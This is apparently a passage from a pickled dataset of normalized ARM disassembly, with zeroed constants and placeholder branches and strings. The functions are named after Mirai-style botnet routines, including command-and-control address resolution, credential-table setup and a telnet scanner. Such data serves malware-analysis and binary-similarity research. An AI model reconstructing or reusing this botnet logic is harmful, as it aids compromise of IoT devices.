0\nADD~R3,SP,0\nADD~R3,R3,0\nBL~FOO\nLDR~R3,[SP,0]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R7]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R7]\nBL~FOO\nMOV~R1,0\nBL~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nADD~R6,SP,0\nADD~R6,R6,0\nMOV~R0,R6\nBL~FOO\nSTRB~R0,[SP,0]\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nLDR~R5,<STR>\nLDR~R0,[R5]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R0,[R5]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDRB~R2,[SP,0]\nCMP~R2,0\nBEQ~FOO\nLDR~R0,[R5]\nMOV~R1,R6\nMOV~R3,0\nBL~FOO\nB~FOO\nLDR~R5,<STR>\nLDR~R2,[R5]\nCMN~R2,0\nBEQ~FOO\nMOV~R3,R2,LSR0\nMOV~R3,R3,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R3,R12\nAND~R2,R2,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nBL~FOO\nMOV~R6,R0\nSTR~R4,[R0]\nLDR~R0,[R5]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nADD~R3,R3,R2\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R6]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nB~FOO\nCMP~R0,0\nBNE~FOO\nBL~FOO\nB~FOO\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORRS~R2,R2,R3,LSL0\nBNE~FOO\nLDR~R0,[R7]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nB~FOO\nAND~R3,R2,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R2,LSR0\nSTRB~R3,[SP,0]\nMOV~R2,R3,ASR0\nSTRB~R2,[SP,0]\nCMP~R3,0\nBLS~FOO\nLDR~R0,[R7]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R7]\nSTR~R4,[R6]\nLDRB~R3,[SP,0]\nLDRB~R2,[SP,0]\nLDR~R0,[R7]\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R1,R12,R9\nORR~R2,R3,R2,LSL0\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R6]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nB~FOO\nCMP~R0,0\nBNE~FOO\nBL~FOO\nB~FOO\nLDR~R0,[R7]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORR~R2,R2,R3,LSL0\nSTRB~R2,[SP,0]\nMOV~R3,R2,ASR0\nSTRB~R3,[SP,0]\nLDR~R0,[R7]\nMOV~R1,R11\nMOV~R3,0\nBL~FOO\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORRS~R1,R2,R3,LSL0\nBEQ~FOO\nMOV~R0,R11\nBL~FOO\nB~FOO\nMOV~R0,0\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p101
L2308L
tp102
a(S'resolve_cnc_addr'
p103
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nBL~FOO\nMOV~R6,R0\nMOV~R0,0\nBL~FOO\nCMP~R6,0\nLDMEQFD~SP!,{R4-R6,PC}\nLDR~R5,[R6,0]\nBL~FOO\nLDR~R4,<STR>\nLDRB~R1,[R6]\nBL~FOO\nLDR~R3,[R5,R0,LSL0]\nSTR~R3,[R4,0]\nMOV~R0,R6\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nMOV~R0,0\nBL~FOO\nLDMFD~SP!,{R4-R6,PC}"'
p104
L140L
tp105
a(S'rand_next'
p106
S'"LDR~R1,<STR>\nLDR~R2,[R1]\nEOR~R2,R2,R2,LSL0\nLDR~R0,<STR>\nLDR~R3,[R0]\nSTR~R3,[R1]\nLDR~R1,<STR>\nLDR~R3,[R1]\nSTR~R3,[R0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nSTR~R0,[R1]\nEOR~R0,R0,R0,LSR0\nEOR~R0,R2,R0\nEOR~R0,R0,R2,LSR0\nSTR~R0,[R3]\nRET"'
p107
L68L
tp108
a(S'rand_str'
p109
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R5,R0\nSUBS~R4,R1,0\nLDMLEFD~SP!,{R4,R5,PC}\nCMP~R4,0\nBLE~FOO\nBL~FOO\nSTR~R0,[R5]\nSUB~R4,R4,0\nB~FOO\nCMP~R4,0\nBLE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nADD~R5,R5,0\nSUB~R4,R4,0\nB~FOO\nBL~FOO\nSTRB~R0,[R5]\nSUB~R4,R4,0\nCMP~R4,0\nBGT~FOO\nLDMFD~SP!,{R4,R5,PC}"'
p110
L100L
tp111
a(S'rand_alphastr'
p112
S'"STMFD~SP!,{R4-R6,LR}\nSUB~SP,SP,0\nMOV~R5,R0\nMOV~R4,R1\nADD~R0,SP,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nCMP~R4,0\nBLE~FOO\nMOV~R6,R4\nCMP~R4,0\nBLS~FOO\nBL~FOO\nMOV~R1,R5\nMOV~R2,0\nAND~R3,R0,0\nMOV~R0,R0,LSR0\nADD~R12,SP,0\nADD~R3,R12,R3,LSR0\nLDRB~R3,[R3,-0]\nSTRB~R3,[R1]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nADD~R5,R5,0\nSUB~R4,R6,0\nB~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5]\nSUB~R4,R4,0\nCMP~R4,0\nBGT~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R6,PC}"'
p113
L148L
tp114
a(S'rand_init'
p115
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R0,0\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nBL~FOO\nMOV~R4,R0\nBL~FOO\nLDR~R5,<STR>\nEOR~R4,R4,R0\nSTR~R4,[R5]\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nLDR~R3,[R5]\nEOR~R0,R0,R3\nLDR~R3,<STR>\nSTR~R0,[R3]\nLDMFD~SP!,{R4,R5,PC}"'
p116
L76L
tp117
a(S'resolv_skip_name'
p118
S'"MOV~R12,R2\nMOV~R3,0\nSTR~R3,[R2]\nMOV~R2,0\nB~FOO\nCMP~R3,0\nBLS~FOO\nMOV~R3,R3,LSL0\nLDRB~R2,[R0,0]\nADD~R3,R3,R2\nSUB~R3,R3,0\nADD~R0,R3,R1\nMOV~R2,0\nB~FOO\nADD~R0,R0,0\nCMP~R2,0\nLDREQ~R3,[R12]\nADDEQ~R3,R3,0\nSTREQ~R3,[R12]\nLDRB~R3,[R0]\nCMP~R3,0\nBNE~FOO\nCMP~R2,0\nLDREQ~R3,[R12]\nADDEQ~R3,R3,0\nSTREQ~R3,[R12]\nRET"'
p119
L108L
tp120
a(S'resolv_entries_free'
p121
S'"STMFD~SP!,{R4,LR}\nSUBS~R4,R0,0\nLDMEQFD~SP!,{R4,PC}\nLDR~R0,[R4,0]\nCMP~R0,0\nBLNE~FOO\nMOV~R0,R4\nBL~FOO\nLDMFD~SP!,{R4,PC}"'
p122
L36L
tp123
a(S'resolv_domain_to_hostname'
p124
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R4,R0\nMOV~R5,R1\nMOV~R0,R1\nBL~FOO\nADD~R1,R4,0\nADD~R0,R0,0\nMOV~R3,0\nB~FOO\nLDRB~R2,[R5]\nCMP~R2,0\nCMPNE~R2,0\nSTREQB~R3,[R4]\nADDEQ~R2,R1,0\nMOVEQ~R4,R1\nMOVEQ~R3,0\nADDNE~R3,R3,0\nANDNE~R3,R3,0\nSTRNEB~R2,[R1]\nMOVNE~R2,R1\nADD~R5,R5,0\nSUB~R0,R0,0\nMOV~R1,R2\nCMP~R0,0\nBGT~FOO\nMOV~R3,0\nSTRB~R3,[R1]\nLDMFD~SP!,{R4,R5,PC}"'
p125
L112L
tp126
a(S'resolv_lookup'
p127
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nADD~R3,SP,0\nADD~R9,R3,0\nMOV~R0,R9\nMOV~R1,R4\nBL~FOO\nMOV~R0,R9\nBL~FOO\nADD~R8,R9,R0\nADD~R7,R8,0\nMOV~R6,0\nADD~R0,SP,0\nADD~R3,R0,R6\nMOV~R5,0\nSTR~R5,[R0,R6]\nADD~R3,R3,0\nSTR~R5,[R3]\nSTR~R5,[R3]\nSTR~R5,[R3]\nMOV~R0,R9\nBL~FOO\nADD~R0,R0,0\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTR~R0,[SP,0]\nADD~R1,SP,0\nADD~R4,R1,R6\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R3,0\nADD~R2,SP,0\nSTRB~R3,[R2,R6]\nSTRB~R5,[R4,0]\nMOV~R3,0\nORR~R3,R3,R3,LSL0\nSTR~R3,[R4,0]\nSTRB~R5,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nLDR~R3,[SP,0]\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R5,[SP,0]\nSTRB~R5,[SP,0]\nSTRB~R3,[SP,0]\nSTRB~R5,[R8,0]\nSTRB~R3,[R7,0]\nSTRB~R5,[R7,0]\nSTRB~R3,[R7,0]\nMOV~R7,0\nMOV~R10,R3\nMOV~R1,0\nSTR~R1,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nMOV~R11,0\nMOV~R3,0\nSTR~R3,[SP,0]\nCMN~R7,0\nMOVNE~R0,R7\nBLNE~FOO\nMOV~R0,0\nMOV~R1,R0\nMOV~R2,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBNE~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nADD~R2,SP,0\nLDR~R3,[SP,0]\nADD~R1,R2,R3\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nMOV~R0,R7\nADD~R1,SP,0\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nMOV~R1,R7\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,0\nMOV~R1,R7\nBL~FOO\nMOV~R3,0\nLDR~R6,[SP,0]\nADD~R0,SP,0\nADD~R1,R0,R6\nMOV~R4,R3\nSTR~R4,[R3,R1]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nMOV~R3,R7,LSR0\nAND~R8,R7,0\nMOV~R3,R3,LSL0\nADD~R2,SP,0\nADD~R5,R3,R2\nLDR~R3,[R5,R6]\nMOV~R2,0\nORR~R3,R3,R2,LSLR8\nSTR~R3,[R5,R6]\nADD~R3,SP,0\nADD~R2,R3,R11\nMOV~R3,0\nADD~R0,SP,0\nSTR~R3,[R0,R11]\nSTR~R4,[R2,0]\nSTR~R2,[SP]\nADD~R0,R7,0\nMOV~R2,R4\nMOV~R3,R4\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nBEQ~FOO\nLDR~R3,[R5,R6]\nMOV~R3,R3,ASRR8\nTST~R3,0\nBEQ~FOO\nADD~R5,SP,0\nSTR~R4,[SP]\nSTR~R4,[SP,0]\nMOV~R0,R7\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nMOV~R0,R9\nBL~FOO\nADD~R0,R0,0\nCMP~R4,R0\nBCC~FOO\nADD~R9,R5,0\nMOV~R0,R9\nBL~FOO\nADD~R0,R9,R0\nADD~R6,R0,0\nLDRB~R3,[R5]\nLDRB~R2,[SP,0]\nORR~R3,R3,R2,LSL0\nLDR~R1,[SP,0]\nCMP~R3,R1\nBNE~FOO\nLDRB~R2,[R5,0]\nLDRB~R3,[R5,0]\nORRS~R2,R2,R3,LSL0\nBEQ~FOO\nAND~R3,R2,0\nMOV~R3,R3,LSL0\nORR~R8,R3,R2,LSR0\nLDR~R9,[SP,0]\nMOV~R11,0\nB~FOO\nADD~R10,SP,0\nMOV~R0,R6\nMOV~R1,R10\nADD~R3,SP,0\nADD~R2,R3,R9\nBL~FOO\nADD~R0,SP,0\nLDR~R3,[R0,R9]\nADD~R4,R6,R3\nADD~R5,R4,0\nLDRB~R3,[R6,R3]\nLDRB~R2,[R4,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,0\nBNE~FOO\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,0\nBNE~FOO\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nORR~R3,R3,R2,LSL0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nAND~R2,R2,0\nORR~R2,R2,R3,LSR0\nCMP~R2,0\nBNE~FOO\nLDRB~R3,[R4,0]\nSTRB~R3,[R0,R11]\nADD~R2,R0,R11\nLDRB~R3,[R5,0]\nSTRB~R3,[R2,0]\nLDRB~R3,[R5,0]\nSTRB~R3,[R2,0]\nLDRB~R3,[R5,0]\nSTRB~R3,[R2,0]\nLDR~R2,[SP,0]\nLDRB~R1,[R2]\nMOV~R1,R1,LSL0\nLDR~R0,[R2,0]\nADD~R1,R1,0\nBL~FOO\nLDR~R3,[SP,0]\nSTR~R0,[R3,0]\nLDR~R1,[SP,0]\nLDRB~R3,[R1]\nADD~R1,SP,0\nLDR~R2,[R1,R11]\nSTR~R2,[R0,R3,LSL0]\nADD~R3,R3,0\nLDR~R2,[SP,0]\nSTRB~R3,[R2]\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nORR~R3,R3,R2,LSL0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nAND~R2,R2,0\nORR~R2,R2,R3,LSR0\nADD~R6,R5,R2\nB~FOO\nMOV~R0,R5\nMOV~R1,R10\nADD~R3,SP,0\nADD~R2,R3,R9\nBL~FOO\nADD~R0,SP,0\nLDR~R3,[R0,R9]\nADD~R6,R5,R3\nSUB~R3,R8,0\nMOV~R3,R3,LSL0\nMOV~R8,R3,LSR0\nMOV~R3,0\nCMP~R8,R3\nBNE~FOO\nB~FOO\nCMP~R10,0\nADDNE~R10,R10,0\nBNE~FOO\nMOV~R0,R7\nBL~FOO\nLDR~R1,[SP,0]\nLDRB~R4,[R1]\nCMP~R4,0\nBNE~FOO\nMOV~R0,R1\nBL~FOO\nSTR~R4,[SP,0]\nLDR~R0,[SP,0]\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p128
L1148L
tp129
a(S'consume_any_prompt'
p130
S'"MOV~R2,R0\nLDR~R3,[R0,0]\nSUB~R0,R3,0\nCMP~R0,0\nBLE~FOO\nADD~R3,R0,R2\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nB~FOO\nADD~R3,R0,R2\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R0,R0,0\nCMN~R0,0\nMOVNE~PC,LR\nB~FOO\nSUBS~R0,R0,0\nBNE~FOO\nMOV~R0,0\nRET"'
p131
L144L
tp132
a(S'can_consume'
p133
S'"MOV~R3,R0\nADD~R0,R0,0\nLDR~R3,[R3,0]\nADD~R0,R0,R3\nADD~R2,R2,R1\nCMP~R0,R2\nMOVLS~R0,0\nMOVHI~R0,0\nRET"'
p134
L36L
tp135
a(S'scanner_kill'
p136
S'"STR~LR,[SP,-0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,0\nBL~FOO\nLDR~PC,[SP]"'
p137
L24L
tp138
a(S'deobf'
p139
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R4,R0\nMOV~R6,R1\nBL~FOO\nSTR~R0,[R6]\nADD~R0,R0,0\nBL~FOO\nMOV~R5,R0\nLDR~R2,[R6]\nMOV~R1,R4\nADD~R2,R2,0\nBL~FOO\nLDR~R3,[R6]\nCMP~R3,0\nBLE~FOO\nMOV~R0,0\nMOV~R1,R3\nLDRB~R3,[R0,R5]\nEOR~R3,R3,0\nSTRB~R3,[R0,R5]\nADD~R0,R0,0\nCMP~R1,R0\nBGT~FOO\nMOV~R0,R5\nLDMFD~SP!,{R4-R6,PC}"'
p140
L100L
tp141
a(S'add_auth_entry'
p142
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R9,R0\nMOV~R11,R1\nMOV~R7,R2,LSL0\nMOV~R7,R7,LSR0\nLDR~R5,<STR>\nLDR~R6,<STR>\nLDR~R1,[R6]\nMOV~R1,R1,LSL0\nLDR~R0,[R5]\nADD~R1,R1,0\nBL~FOO\nMOV~R8,R0\nSTR~R0,[R5]\nLDR~R4,[R6]\nMOV~R4,R4,LSL0\nMOV~R10,SP\nMOV~R0,R9\nMOV~R1,SP\nBL~FOO\nSTR~R0,[R8,R4]\nLDR~R3,[R6]\nLDR~R2,[R5]\nMOV~R3,R3,LSL0\nADD~R3,R3,R2\nLDR~R2,[SP]\nSTRB~R2,[R3,0]\nLDR~R4,[R6]\nMOV~R4,R4,LSL0\nLDR~R3,[R5]\nADD~R4,R4,R3\nMOV~R0,R11\nMOV~R1,SP\nBL~FOO\nSTR~R0,[R4,0]\nLDR~R3,[R6]\nLDR~R2,[R5]\nMOV~R3,R3,LSL0\nADD~R3,R3,R2\nLDR~R2,[SP]\nSTRB~R2,[R3,0]\nLDR~R1,[R6]\nLDR~R3,[R5]\nLDR~R0,<STR>\nMOV~R1,R1,LSL0\nADD~R1,R1,R3\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R1,[R6]\nLDR~R12,[R5]\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nADD~R3,R7,R3\nMOV~R2,R1,LSL0\nADD~R2,R2,R12\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nADD~R1,R1,0\nSTR~R1,[R6]\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nADD~R7,R7,R3\nSTRB~R7,[R0]\nMOV~R7,R7,ASR0\nSTRB~R7,[R0,0]\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p143
L300L
tp144
a(S'setup_connection'
p145
S'"STMFD~SP!,{R4-R6,LR}\nSUB~SP,SP,0\nMOV~R6,R0\nMOV~R3,0\nSTR~R3,[SP]\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nLDR~R0,[R0,0]\nCMN~R0,0\nBLNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[R6,0]\nCMN~R0,0\nBEQ~FOO\nMOV~R5,0\nSTR~R5,[R6,0]\nADD~R0,R6,0\nMOV~R1,0\nBL~FOO\nLDR~R4,[R6,0]\nMOV~R0,R4\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R3,0\nSTRB~R3,[SP]\nSTRB~R5,[SP,0]\nLDR~R3,[R6,0]\nSTR~R3,[SP,0]\nLDR~R3,[R6,0]\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R6,0]\nMOV~R3,0\nSTR~R3,[R6,0]\nLDR~R0,[R6,0]\nMOV~R1,SP\nMOV~R2,0\nBL~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R6,PC}"'
p146
L208L
tp147
a(S'recv_strip_null'
p148
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R1\nBL~FOO\nCMP~R0,0\nLDMLEFD~SP!,{R4,PC}\nMOV~R2,0\nMOV~R1,0\nLDRB~R3,[R2,R4]\nCMP~R3,0\nSTREQB~R1,[R2,R4]\nADD~R2,R2,0\nCMP~R0,R2\nBNE~FOO\nLDMFD~SP!,{R4,PC}"'
p149
L56L
tp150
a(S'scanner_init'
p151
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R4,R3\nORRGT~R4,R3,0\nCMP~R4,0\nBNE~FOO\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nSTR~R4,[SP,0]\nMOV~R0,R4\nMOV~R12,R3\nMOV~R5,0\nMOV~LR,0\nLDR~R1,[R12]\nMOV~R3,R0,LSL0\nMOV~R2,R0,LSL0\nADD~R3,R3,R2\nADD~R3,R3,R1\nSTR~R5,[R3,0]\nLDR~R2,[SP,0]\nLDR~R1,[R12]\nMOV~R3,R2,LSL0\nMOV~R2,R2,LSL0\nADD~R3,R3,R2\nADD~R3,R3,R1\nSTR~LR,[R3,0]\nLDR~R3,[SP,0]\nADD~R0,R3,0\nSTR~R0,[SP,0]\nCMP~R0,0\nBLE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R4,R0\nLDR~R3,<STR>\nSTR~R0,[R3]\nCMN~R0,0\nMOVEQ~R0,R5\nBLEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nLDR~R4,<STR>\nLDR~R0,[R4]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDR~R0,[R4]\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R1,R0,LSR0\nSTR~R1,[SP,0]\nAND~R3,R1,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R0,LSR0\nCMP~R3,0\nBCC~FOO\nLDR~R2,<STR>\nADD~R11,R2,0\nLDRB~R3,[R2]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R2]\nLDRB~R3,[R2]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R2]\nMOV~R4,0\nSTRB~R4,[R2,0]\nMOV~R3,0\nSTRB~R3,[R2,0]\nBL~FOO\nLDR~R3,<STR>\nSTRB~R0,[R3,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R3,0]\nMOV~R3,0\nLDR~R1,<STR>\nSTRB~R3,[R1,0]\nMOV~R7,0\nSTRB~R7,[R1,0]\nSTRB~R4,[R11,0]\nSUB~R3,R3,0\nSTRB~R3,[R11,0]\nLDR~R2,[SP,0]\nSTRB~R2,[R1,0]\nMOV~R3,R2,ASR0\nSTRB~R3,[R11,0]\nLDRB~R3,[R11,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R11,0]\nBL~FOO\nSTRB~R0,[R11,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R11,0]\nLDRB~R3,[R11,0]\nORR~R3,R3,0\nSTRB~R3,[R11,0]\nLDR~R5,<STR>\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R6,<STR>\nMOV~R0,R5\nMOV~R1,R6\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R6\nMOV~R2,0\nBL~FOO\nLDR~R8,<STR>\nMOV~R0,R5\nMOV~R1,R8\nMOV~R2,R7\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R7,<STR>\nMOV~R0,R5\nMOV~R1,R7\nMOV~R2,0\nBL~FOO\nLDR~R10,<STR>\nMOV~R0,R5\nMOV~R1,R10\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nLDR~R4,<STR>\nMOV~R0,R5\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nLDR~R9,<STR>\nMOV~R0,R6\nMOV~R1,R9\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,R0\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R4,<STR>\nMOV~R0,R5\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nMOV~R1,R9\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nLDR~R4,<STR>\nMOV~R0,R4\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,R9\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,R0\nMOV~R2,0\nBL~FOO\nMOV~R0,R8\nMOV~R1,R8\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R4,<STR>\nMOV~R0,R5\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~